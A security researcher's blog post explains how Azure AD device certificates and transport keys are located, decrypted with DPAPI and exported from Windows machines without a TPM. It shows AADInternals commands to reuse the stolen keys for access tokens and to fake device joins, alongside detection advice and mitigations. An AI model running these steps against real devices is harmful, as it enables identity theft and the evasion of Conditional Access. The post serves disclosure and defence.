+++
title = "Stealing and faking Azure AD device identities"
date = "2022-02-15"
lastmod = "2022-02-17"
categories =["blog"]
tags = ["Azure Active Directory","Azure","security","PRT","device","join","hybrid join"]
thumbnail = "/images/posts/deviceidentity.png"
+++

In my previous blog posts I've covered details on <a href="/post/prt" target="_blank"> PRTs</a>, <a href="/post/bprt" target="_blank">BPRTs</a>, <a href="/post/mdm" target="_blank">device compliance</a>, and Azure AD <a href="/post/devices" target="_blank">device join</a>.


In this blog, I'll show how to **steal identities of existing Azure AD joined devices**, and how to **fake identies** of non-AAD joined **Windows devices** with <a href="/aadinternals/" target="_blank">AADInternals</a> **v0.6.6**.

<!--more-->
# Introduction

As described in my earlier <a href="/post/devices#register" target="_blank">blog post</a>, when the device is joined or registered to AAD, two set of keys are created.
These key sets are **Device key (dkpub/dkpriv)** and **Transport key (tkpub/tkpriv)**. Both public keys (dkpub and tkpub) are sent to Azure AD.
Public and private keys are stored in the device, either on disk (encrypted with DPAPI) or in TPM.

Thanks to tools like <a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz</a>, I knew that those **keys could be exported from the devices**! 

However, this requires two things:

* The target computer is **NOT using TPM**
* The attacker has **local admin** permissions to target computer

# Accessing the certificate and keys

The first task of the journey was to find out is it really possible to export the keys. To do that, I needed to find the keys!

Luckily, Microsoft have a great <a href="https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval#key-directories-and-files" target="_blank">document</a> showing the locations of keys.

Microsoft legacy CryptoAPI CSP:

Key type				|Directories
---						| ---
User private			| %APPDATA%\Microsoft\Crypto\RSA\User SID\ <br> %APPDATA%\Microsoft\Crypto\DSS\User SID\
Local system private	| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\S-1-5-18\ <br> %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\DSS\S-1-5-18\
Local service private	| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\S-1-5-19\ <br> %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\DSS\S-1-5-19\
Network service private	| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\S-1-5-20\ <br> %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\DSS\S-1-5-20\
Shared private			| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\MachineKeys <br> %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\DSS\MachineKeys

Microsoft Cryptography Next Generation (CNG): 

Key type				| Directory
---						| ---
User private			| %APPDATA%\Microsoft\Crypto\Keys
Local system private	| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\SystemKeys
Local service private	| %WINDIR%\ServiceProfiles\LocalService
Network service private	| %WINDIR%\ServiceProfiles\NetworkService
Shared private			| %ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\Keys

## Device Certificate (dkpub / dkpriv)

I already knew that the **Device Certificate** of Azure AD joined computer is located in **Personal** store of **Local Computer**.
The subject of that certificate matches the **Device Id** of that device.

![procmon dump](/images/posts/deviceidentity_03.png)

There are other device related information stored to the certificate in Object Identifiers (OIDs). 
The Device Registration (DRS) protocol documentation has a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dvrj/850786b9-2525-4047-a5ff-8c3093b46b88" target="_blank">list</a> of some of them, but not all, so I had to do some research on those too.

Here is what I found:

OID | Value type | Value 
--- | --- | ---
1.2.840.113556.1.5.284.2 | Guid | DeviceId
1.2.840.113556.1.5.284.3 | Guid | ObjectId
1.2.840.113556.1.5.284.5 | Guid | TenantId
1.2.840.113556.1.5.284.7 | String | Join type:<br>0 = registered <br>1 = joined
1.2.840.113556.1.5.284.8 | String | Tenant region:<br>AF = Africa<br>AS = Asia <br> AP = Australia/Pasific <br> EU = Europe <br>ME = Middle East<br>NA = North America<br>SA = South America

The OID values are DER encoded. The first byte 0x04 means BITSTRING, and the second byte the length of length in bytes (0x80 = LENGTH, 0x01 = one byte, 0x80+0x01=0x81). The third is the length of the data in bytes, and the remaining bytes the actual data.
For instance, the tenant id is just a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.guid.tobytearray#examples" target="_blank">byte array presentation</a> of guid object, where the bytes are grouped differently:

![OIDs](/images/posts/deviceidentity_14.png)

But how does Windows know which certificate to use as a Device Certificate? And where the private key is stored?

Most of you already know that <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/troubleshoot-device-dsregcmd" target="_blank">dsregcmd</a> **/status** can be used to show details about AAD Joined and AAD Registered devices similar to this (not all information shown):

{{< highlight text "linenos=inline,hl_lines=15 27 71" >}}
+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+

             AzureAdJoined : YES
          EnterpriseJoined : NO
              DomainJoined : NO
               Device Name : AADJoin02

+----------------------------------------------------------------------+
| Device Details                                                       |
+----------------------------------------------------------------------+

                  DeviceId : ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679
                Thumbprint : CEC55C2566633AC8DA3D9E3EAD98A599084D0C4C
 DeviceCertificateValidity : [ 2022-01-28 11:15:49.000 UTC -- 2032-01-28 11:45:49.000 UTC ]
            KeyContainerId : 0ad54eab-ba59-4d5b-8ee6-be18fd62b881
               KeyProvider : Microsoft Software Key Storage Provider
              TpmProtected : NO
          DeviceAuthStatus : SUCCESS

+----------------------------------------------------------------------+
| Tenant Details                                                       |
+----------------------------------------------------------------------+

                TenantName : Contoso
                  TenantId : c5ff949d-2696-4b68-9e13-055f19ed2d51
                       Idp : login.windows.net
               AuthCodeUrl : https://login.microsoftonline.com/c5ff949d-2696-4b68-9e13-055f19ed2d51/oauth2/authorize
            AccessTokenUrl : https://login.microsoftonline.com/c5ff949d-2696-4b68-9e13-055f19ed2d51/oauth2/token
                    MdmUrl :
                 MdmTouUrl :
          MdmComplianceUrl :
               SettingsUrl :
            JoinSrvVersion : 2.0
                JoinSrvUrl : https://enterpriseregistration.windows.net/EnrollmentServer/device/
                 JoinSrvId : urn:ms-drs:enterpriseregistration.windows.net
             KeySrvVersion : 1.0
                 KeySrvUrl : https://enterpriseregistration.windows.net/EnrollmentServer/key/
                  KeySrvId : urn:ms-drs:enterpriseregistration.windows.net
        WebAuthNSrvVersion : 1.0
            WebAuthNSrvUrl : https://enterpriseregistration.windows.net/webauthn/c5ff949d-2696-4b68-9e13-055f19ed2d51/
             WebAuthNSrvId : urn:ms-drs:enterpriseregistration.windows.net
    DeviceManagementSrvVer : 1.0
    DeviceManagementSrvUrl : https://enterpriseregistration.windows.net/manage/c5ff949d-2696-4b68-9e13-055f19ed2d51/
     DeviceManagementSrvId : urn:ms-drs:enterpriseregistration.windows.net

+----------------------------------------------------------------------+
| User State                                                           |
+----------------------------------------------------------------------+

                    NgcSet : NO
           WorkplaceJoined : NO
             WamDefaultSet : NO

+----------------------------------------------------------------------+
| SSO State                                                            |
+----------------------------------------------------------------------+

                AzureAdPrt : NO
       AzureAdPrtAuthority :
             EnterprisePrt : NO
    EnterprisePrtAuthority :

+----------------------------------------------------------------------+
| Diagnostic Data                                                      |
+----------------------------------------------------------------------+

        AadRecoveryEnabled : NO
    Executing Account Name : AADJOIN02\PCUser
               KeySignTest : PASSED

{{< /highlight>}}

The output shows some interesting things, like thumbprint matching the Device Certificate thumbprint (line 15), tenant id (line 27) and KeySignTest result (line 71). So, time to start up <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">Process Monitor</a>
to see what happens when the **dsregcmd /status** is executed.

Searching for thubmprint revealed that **desregcmd.exe** was accessing the following registry keys/values:

![procmon dump](/images/posts/deviceidentity_01.png)

This tells us that there is a registry key matching the certificate thumbprint:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo\<thumbprint>
```

Next, I found another registry key, containing most of the **Tenant details** shown by **dsregcmd**:

![procmon dump](/images/posts/deviceidentity_02.png)

This tells us that there is a registry key matching the tenant id:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CloudDomainJoin\TenantInfo\<tenant id>
```

While browsing down the procmon output, I found that **lsass.exe** was first reading the Device Certificate and then read a file from **folder that was NOT one of the CNG key stores**:

![procmon dump](/images/posts/deviceidentity_04.png)

So **lsass.exe** must be reading something from the certificate that tells where the key is stored. After some intensive Googling, I found at there is some information about the private key that could be read. 
The following PowerShell script dumps the **unique name** of the private key of the Device Certificate.

{{< highlight powershell >}}
# Read the certificate
$certificate = Get-Item Cert:\LocalMachine\My\CEC55C2566633AC8DA3D9E3EAD98A599084D0C4C

# Dump the unique name of private key
[System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($certificate).key.uniquename
{{< /highlight>}}

The output shows that the unique matches the key file from above!
```
8bff0b7f02f6256b521de95a77d4e70d_321154c9-4462-4db7-aa81-81912067ab9a
```

This tells us that **dkpub** and **dkpriv** are stored to:
```
%ALLUSERSPROFILE%\Microsoft\Crypto\Keys\<unique name of dkpriv>
```

**Note!** For AAD Registered devices, **dkpub** and **dkpriv** are stored to:
```
%APPDATA%\Microsoft\Crypto\Keys\<unique name of dkpriv>
```

## Transport keys (tkpub / tkpriv)

Finding the location of **tkpub** and **tkpriv** was way more harder than for **dkpub** and **dkpriv**.

### Round 1
 
I searched the procmon output for "transportkey" and found that **lsass.exe** was accessing the following registry key to read **SoftwareKeyTransportKey**.

![registry](/images/posts/deviceidentity_05.png)

Next I noticed that **lsass.exe** was looping through the files at **SystemKeys** until it seemed to find the correct key file.
![procmon output](/images/posts/deviceidentity_06.png)

However, the file name did not match anything I had seen in registry. So how did **lsass.exe** know which to choose?
Opening the key file in my favourite hex editor <a href="https://mh-nexus.de/en/hxd/" target="_blank">HxD</a> showed that the key file had 
a unicode string matching the **SoftwareKeyTransportKey**! 

![hexdump](/images/posts/deviceidentity_07.png)

At this point I thought that I had all I needed and jumped to decrypting the private keys and implemented the functions to **AADInternals**.
However, everything worked only for one tenant ☹

### Round 2
After doing some further testing, it turned out that the registry paths where the key filename was stored were NOT constants, but they had dependencies on the user (for AAD Registered device) and the tenant.
It took me almost a month to figure out how to "calculate" the registry keys. And the fact that AAD Joined and AAD Registered were using
different registry keys didn't made it any easier.

So, it was time to bring in the big guns! I started **Process Monitor** and let in ran while I AAD Registered a device. I didn't find anything new though (except totally different registry key name).
However, checking the call stack revealed calls fo **NgcPregenKey** function of **ngcpopkeysrv.dll**.

![procmon output](/images/posts/deviceidentity_08.png)

Next, I fired up my old friend <a href="http://www.rohitab.com/apimonitor" target="_blank">API Monitor</a> and decided to boldly go where no one should ever go: monitor **lsass.exe** during the AAD Register process 😱

I selected all possible APIs, hooked to **lsass.exe** and registered the device to AAD. After that, I detached from the **lsass.exe**. At this point,
Windows announced that it didn't liked that and told me I had one minute to save my work before reboot 🥶

Luckily, I managed to save the API Monitor capture and started to study it. 
I searched for the first part of the registry path shown in the procmon dump above ("ad8098d0") and got a match!

![API monitor output](/images/posts/deviceidentity_09.png)

Once again a reference to **ngcpopkeysrv.dll**. 
With high hopes, I opened the file in <a href="https://github.com/dnSpy/dnSpy" target="_blank">dnSpy</a> but it was not a .NET dll 😒

The last hope was <a href="https://ghidra-sre.org/" target="_blank">Ghidra</a>, which I had just recently installed. After I had it up and running and the dll was loaded,
I started by searching for **CryptBinaryToStringW** and found a match! 

![Ghidra](/images/posts/deviceidentity_10.png)

I started to work backwards to find which functions were calling this one. 
As Ghidra names all the functions as FUN_xxx (even there is nothing fun about Ghidra!), I renamed functions for something more meaningful, like **xConvertBinaryToString** above.

Finally, I found a location where I saw something hard coded passed to one of the functions:

![Ghidra](/images/posts/deviceidentity_11.png)

So, the string "login.live.com" was passed as unicode string to a function I renamed to **xConvertValueToHexString**.

![Ghidra](/images/posts/deviceidentity_12.png)

Before calling the function I renamed to **xConvertBinaryToString**, there was a call to **BCryptHash**. It seems that Ghidra messed that call somehow,
as the parameters did not make <a href="https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcrypthash" target="_blank">any sense</a>.

As all the registry keys were 64 charactes long, the hash had to be **SHA256**. So, I quickly created a PowerShell script that read
all the values from **JoinInfo** and **TenantInfo**, converted to unicode byte array, and calculated the SHA256 hashes. **Profit !** 💰💰💰

For Azure AD Joined devices, the first key under **PerDeviceKeyTransportKey** is **IdpDomain** from **JoinInfo**. This is always **login.windows.net**.
The second key under that is **TenantId**. 

The transport key name of AAD Joined device is located to:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\Ngc\KeyTransportKey\PerDeviceKeyTransportKey\<SHA256(idp)>\<SHA256(tenant id)>
```

For Azure AD Registered devices I found out that one part was **UserEmail** from **JoinInfo**. I still had to do some more digging as there was still one part missing. I found the last hint from 
the procmon output. There was a call to **memcpy** a couple of lines before call to **CryptBinaryStringW**. For me, it seemed a partial SID.

![SID](/images/posts/deviceidentity_13.png)

After a quick test with PowerShell I could confirm that the missing part was indeed the **SID of the current user**! 

The transport key name of AAD Registered device is located to:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\Ngc\KeyTransportKey\<SHA256(sid)>\<SHA256(idp)>\<SHA256(tenant id)>_<SHA256(user email)>
```


## Decrypting private keys

Now that we know the location of the keys, we need to export those.
After debugging what Mimikatz's **crypto::cng** module did, I learned that the files were <a href="https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/modules/kull_m_key.h#L51" target="_blank">CNG key blobs</a>, containing a set of **dkpub/tkpub** or **dkpriv/tkpriv** keys.

For the **dkpub/tkpub**, there was one property record (Modified) and the actual keys in <a href="https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_rsakey_blob" target="_blank">BCRYPT_RSAKEY_BLOB</a> as **BCRYPT_PUBLIC_KEY_BLOB**.

For the **dkpriv/tkpriv**, there was an encrypted property blob (UI Policy, Device Identity, and Key Usage) and the actual keys in encrypted **BCRYPT_RSAKEY_BLOB** as **BCRYPT_PRIVATE_KEY_BLOB** including the private RSA parameters (**P** and **Q**).

I also learned from the **Mimikatz** that **dkpriv** properties and key blob were both encrypted with our old friend <a href="/post/adsync/" target="_blank">DPAPI</a>!
So, they should be relatively easy to decrypt as I already had implemented functionality to elevate the current process to **lsass** (which is required to get access to system keys) 😊

{{< highlight powershell >}}
Add-Type -path "$PSScriptRoot\Win32Ntv.dll"
[AADInternals.Native]::copyLsassToken()
{{< /highlight>}}

Again, Benjamin had done a great job by figuring out the entropy needed for both encrypted blobs. After banging my head to the wall over a weekend, I realised that I was just missing the null terminator 🤣

The PowerShell code to decrypt the encrypted blobs:

{{< highlight powershell >}}
$DPAPI_ENTROPY_CNG_KEY_PROPERTIES = @(0x36,0x6A,0x6E,0x6B,0x64,0x35,0x4A,0x33,0x5A,0x64,0x51,0x44,0x74,0x72,0x73,0x75,0x00) # "6jnkd5J3ZdQDtrsu" + null terminator 
$DPAPI_ENTROPY_CNG_KEY_BLOB       = @(0x78,0x54,0x35,0x72,0x5A,0x57,0x35,0x71,0x56,0x56,0x62,0x72,0x76,0x70,0x75,0x41,0x00) # "xT5rZW5qVVbrvpuA" + null terminator

# Decrypt the private key properties using DPAPI
$decPrivateProperties = [Security.Cryptography.ProtectedData]::Unprotect($privatePropertiesBlob, $DPAPI_ENTROPY_CNG_KEY_PROPERTIES, "LocalMachine")

# Decrypt the private key blob using DPAPI
$decPrivateBlob = [Security.Cryptography.ProtectedData]::Unprotect($privateKeyBlob, $DPAPI_ENTROPY_CNG_KEY_BLOB, "LocalMachine")
{{< /highlight>}}

**Note!** For AAD Registered devices, use "CurrentUser" instead of "LocalMachine"


The encrypted private key was **BCRYPT_PRIVATE_KEY_BLOB** that has P and Q parameters, but the **System.Security.Cryptography.**<a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsaparameters#summary-of-fields" target="_blank">RSAParameters</a> would also need **DP**, **DQ**, **InverseQ**, and **D** parameters.
This information would have been available in **BCRYPT_RSAFULLPRIVATE_BLOB**. The solution was to use **NCryptImportKey** to import the blob as **RSAPRIVATEBLOB** and export with **NCryptExportKey** as **RSAFULLPRIVATEBLOB**.

Lastly, I implemented the last missing part, a parser that was able to read **BCRYPT_RSAFULLPRIVATE_BLOB** and create a **System.Security.Cryptography.RSAParameters** object.

# Stealing the device identity

## Device Certificate and keys

To export the Device Certificate and keys, run the following command as administrator:

{{< highlight powershell >}}
# Export the device certificate and keys:
Export-AADIntLocalDeviceCertificate
{{< /highlight>}}

Output:
```
Certificate exported to ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679.pfx
```

## Transport keys

To export the Device Certificate and keys, run the following **AADInternals** functions as administrator:

{{< highlight powershell >}}
# Export the transport key:
Export-AADIntLocalDeviceTransportKey
{{< /highlight>}}

Output:
```
WARNING: Running as LOCAL SYSTEM. You MUST restart PowerShell to restore AADJOIN02\User rights.
Transport key exported to ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679_tk.pem
```
**Note:** Accessing transport keys requires local system rights, so AADInternals elevates the current session. This 
can not be reversed, so you need to open a new PowerShell session to return "normal" rights. For AAD Registered devices, export the Device Certificate and keys first!

Now you can copy the certificate and transport key to another location to be used later.

## Detecting

The detection of exporting the Device certificate and dkpub/dkpriv & tkpub/tkpriv keys can only happen at the endpoint. 
The next day after publishing this blog post, Roberto Rodriguez (<a href="https://twitter.com/Cyb3rWard0g" target=2_blank">@Cyb3rWard0g</a>) published detection query for Sentinel <a href="https://github.com/Azure/Azure-Sentinel/pull/4199/commits" target="_blank">here</a>.

For short, you should set an access control entry (ACE) on system access control list (SACL) for the following registry keys:

Key | Note
--- | ---
HKLM:\SYSTEM\CurrentControlSet\Control\CloudDomainJoin                  | AAD Joined devices
HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WorkplaceJoin        | AAD Registered devices
HKLM:\SYSTEM\CurrentControlSet\Control\Cryptography\Ngc\KeyTransportKey | Transport Key

If the user accessing these registry keys is NOT **lsass**, an alarm should be raised.

# Using the stolen device identity

To use the stolen identity, run the following **AADInternals** functions:

{{< highlight powershell >}}
# Save credentials to a variable (must be from the same tenant as the device)
# If MFA is required, omit the credentials for interactive log in.
$cred = Get-Credential

# Get PRT settings:
$prtKeys = Get-AADIntUserPRTKeys -Credentials $cred -PfxFileName .\ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679.pfx -TransportKeyFileName .\ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679_tk.pem

# Create a PRT token:
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GetNonce

# Get access token:
$at = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
{{< /highlight>}}

Output:
```
Keys saved to ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679.json

```
Now, let's see how the access token looks like:

{{< highlight powershell >}}
# Dump the access token
Read-AADIntAccesstoken -AccessToken $at
{{< /highlight>}}
Output:
{{< highlight text "linenos=inline,hl_lines=7 10" >}}
aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/2cd0c645-212d-46cc-be2b-e3ab9b4434ac/
iat                 : 1644169150
nbf                 : 1644169150
exp                 : 1644173781
acr                 : 1
amr                 : {pwd, rsa, mfa}
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
deviceid            : ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679
family_name         : John
given_name          : Doe
ipaddr              : 214.63.172.228
name                : John Doe
oid                 : 47bd560e-fd5e-42c5-b51b-ce963892805f
onprem_sid          : S-1-5-21-1357286652-147530443-861848650-6407
scp                 : user_impersonation
tenant_region_scope : EU
tid                 : 2cd0c645-212d-46cc-be2b-e3ab9b4434ac1
unique_name         : JohnD@company.com
upn                 : JohnD@company.com
ver                 : 1.0
{{< /highlight>}}

As we can see, the access tokens obtained using the PRT token will have the **deviceId** claim (line 10). 
Depending on how did you get the PRT keys, you'll also have **rsa** and possibly **mfa** claims (line 7).

# Faking device identity

What about doing this the other way around - would it be possible to fake the identity of Windows computer? For short, yes it is!

We have two options: 

1. Create a <a href="/post/prt/#creating-your-own-prt" target="_blank">fake device</a> identity with AADInternals
2. Use the stolen identity

Only difference is that the former uses just one .pfx file, whereas the stolen identity has also the transport key in .pem file.

When "joining" the local device, AADInternals emulates the real join process and will do the following:

* Create a P2P certificate
* Import the device and P2P certificates
* Import P2P CA to AAD Token Issuer
* Store transportkey
* Set registry information
* Start scheduled tasks 

To create a fake device with AADInternals:
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Join the fake device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}

Output should be similar to below.
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  ObjectId:        afdeac87-b32a-41a0-95ad-0a555a91f0a4
  TenantId:        8aeb6b82-6cc7-4e33-becd-97566b330f5b
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
``` 

Now we are ready fake the identity of our non-AAD joined Windows computer! The device may have a TPM, that doesn't matter.

To "join" the computer with a fake identity created above:
{{< highlight powershell >}}
# Join the device using the fake identity
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "JohnD@company.com" -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
{{< /highlight>}}
Output:
```
Device P2P certificate successfully created:
  Subject:         "CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=8aeb6b82-6cc7-4e33-becd-97566b330f5b"
  DnsNames:        "d03994c9-24f8-41ba-a156-1805998d6dc7"
  Issuer:          "CN=MS-Organization-P2P-Access [2021]"
  Cert thumbprint: A5F4752D34F90A8E7B14C985C4AA77AB583CD1F1
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der"
  
Device configured. To confirm success, restart and run: dsregcmd /status
```

To "join" the computer with the stolen identity from above:
{{< highlight powershell >}}
# Join the device using the stolen identity
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "JohnD@company.com" -PfxFileName .\ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679.pfx -TransportKeyFileName .\ea77c7d5-7b2f-4567-bf0c-c0a4ceb8b679_tk.pem
{{< /highlight>}}

After updating the join information, restart the computer and log in with the username used above.

# Summary

In this blog post, I showed three things:

* How to export the device certificate and transport key of Azure Joined or Registered devices from Windows computers not having TPM 
* How to use the stolen device identity
* How to fake AAD Join by configuring non-AAD joined Windows computer to use the provided certificate (and transport key)

Stealing (and faking) device identities allows threat actors to access the target tenant using the identity of the stolen or faked device.
This may allow evading device based Conditional Access (CA) policies, as the compliance of the device is assessed against the original device.

Take-aways:

* Use only devices equipped with a TPM
* Remove local admin rights from standard users on AAD Joined devices
* Do not allow users to join their own devices

# References
* Microsoft: <a href="https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval" target="_blank">Key Storage and Retrieval</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">Process Monitor</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/troubleshoot-device-dsregcmd" target="_blank">Troubleshoot devices by using the dsregcmd command</a>
* Benjamin Delby: Mimikatz source code. <a href="https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/modules/kull_m_key.h" target="_blank">kull_m_key.h</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_rsakey_blob" target="_blank">BCRYPT_RSAKEY_BLOB structure (bcrypt.h)</a>